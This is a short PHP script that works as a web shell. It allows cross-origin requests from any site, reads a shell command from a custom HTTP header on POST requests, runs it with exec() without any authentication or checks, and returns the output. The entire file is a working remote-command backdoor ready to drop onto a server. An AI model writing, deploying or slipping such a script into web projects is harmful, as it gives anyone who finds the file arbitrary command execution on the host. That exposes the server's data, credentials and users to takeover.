<?php
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, command, method');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_SERVER['HTTP_METHOD']) && $_SERVER['HTTP_METHOD'] === 'command') {
        if (isset($_SERVER['HTTP_COMMAND'])) {
            $command = $_SERVER['HTTP_COMMAND'];
            exec($command, $output, $return_var);
            if (!empty($output)) {
                $response = implode("\n", $output);
                echo $response;
            }
            else {
                echo "No output";
            }
        }
        else {
            http_response_code(403);
            echo "Forbidden: No command specified";
        }
    }
    else {
        http_response_code(403);
        echo "Forbidden: Invalid method";
    }
}
else {
    http_response_code(403);
    echo "Forbidden: Invalid request method";
}
?>
